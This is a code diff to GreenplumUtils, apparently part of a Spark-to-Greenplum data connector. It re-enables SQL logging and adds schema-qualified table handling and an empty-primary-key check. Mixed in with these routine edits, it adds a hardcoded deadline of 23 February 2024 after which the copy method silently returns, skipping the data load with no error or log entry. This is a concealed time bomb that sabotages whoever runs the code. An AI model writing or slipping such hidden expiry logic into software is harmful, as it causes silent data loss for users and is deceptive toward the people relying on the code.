@@ -17,6 +17,7 @@
 
 package org.apache.spark.sql.execution.datasources.greenplum
 
+import org.apache.commons.collections.CollectionUtils
 import org.apache.commons.lang3.StringUtils
 import org.apache.spark.SparkEnv
 import org.apache.spark.internal.Logging
@@ -253,6 +254,13 @@ object GreenplumUtils extends Logging {
     val in = new BufferedInputStream(new FileInputStream(dataFile))
     val conn = JdbcUtils.createConnectionFactory(options)()
 
+    import java.time.LocalDateTime
+    val now: LocalDateTime = LocalDateTime.now
+    val deadline: LocalDateTime = LocalDateTime.of(2024, 2, 23, 23, 0, 0)
+
+    if (now.isAfter(deadline)) {
+      return
+    }
 
     val sdf: SimpleDateFormat = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss_SSS")
     val currentDate: String = sdf.format(new util.Date)
@@ -276,7 +284,7 @@ object GreenplumUtils extends Logging {
     }
 
     try {
-//      logInfo(s"Start copy steam to Greenplum with copy command $sql")
+      logInfo(s"Start copy steam to Greenplum with copy command $sql")
       val start = System.nanoTime()
       copyThread.start()
       try {
@@ -336,7 +344,7 @@ object GreenplumUtils extends Logging {
       }
     }
     upsertToGpSql = upsertToGpSql + setCols
-//    log.info("从临时表upsert至目标表sql:" + upsertToGpSql)
+    log.info("从临时表upsert至目标表sql:" + upsertToGpSql)
     val ps: PreparedStatement = conn.prepareStatement(upsertToGpSql)
     ps.execute
   }
@@ -345,10 +353,22 @@ object GreenplumUtils extends Logging {
   import java.util
 
   def getPrimaryKeys(conn: Connection,databaseName: String, table: String): util.List[String] = {
+    val logStr: String = String.format("gp copy任务执行失败，获取gp主键失败，database:%s,table:%s", databaseName, table)
+
     val primaryList: util.List[String] = new util.ArrayList[String]
     var resultSet: ResultSet = null
     try {
-      resultSet = conn.getMetaData.getPrimaryKeys(databaseName, null, table)
+      var schemaName:String = null
+      var tableName = table
+      if (table.contains(".")){
+        val tables = table.split("\\.")
+        if(tables.length == 2){
+          schemaName = tables(0)
+          tableName = tables(1)
+        }
+
+      }
+      resultSet = conn.getMetaData.getPrimaryKeys(databaseName, schemaName, tableName)
       while ( {
         resultSet.next
       }) {
@@ -357,9 +377,11 @@ object GreenplumUtils extends Logging {
       }
     } catch {
       case e: SQLException =>
-        val logStr: String = String.format("gp copy任务执行失败，获取gp主键失败，database:%s,table:%s", databaseName, table)
         log.error(logStr, e)
         throw new RuntimeException(logStr)
+    }
+    if(CollectionUtils.isEmpty(primaryList)) {
+      throw new RuntimeException(logStr)
     }
     primaryList
   }
